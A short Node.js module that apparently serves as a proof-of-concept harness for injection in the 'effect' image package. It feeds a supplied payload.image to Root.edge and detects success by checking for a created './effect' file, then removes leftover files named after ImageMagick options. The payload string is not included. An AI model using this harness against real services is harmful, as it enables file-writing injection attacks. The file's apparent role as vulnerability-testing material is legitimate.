function exploitFunction(payload) {
  const Root = require("effect");
  const fs = require("fs");
  const path = "./effect";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  Root.edge(payload.image, () => {
    file_exist = fs.existsSync(path);
    if (file_exist) {
      try {
        fs.unlinkSync("-colorspace");
        fs.unlinkSync("-edge");
        fs.unlinkSync("-negate");
        fs.unlinkSync("-resize");
        fs.unlinkSync("5");
        fs.unlinkSync("100%");
        fs.unlinkSync("Gray");
        fs.unlinkSync(path);
      } catch (err) {}
    }
  });
}

module.exports = { exploitFunction };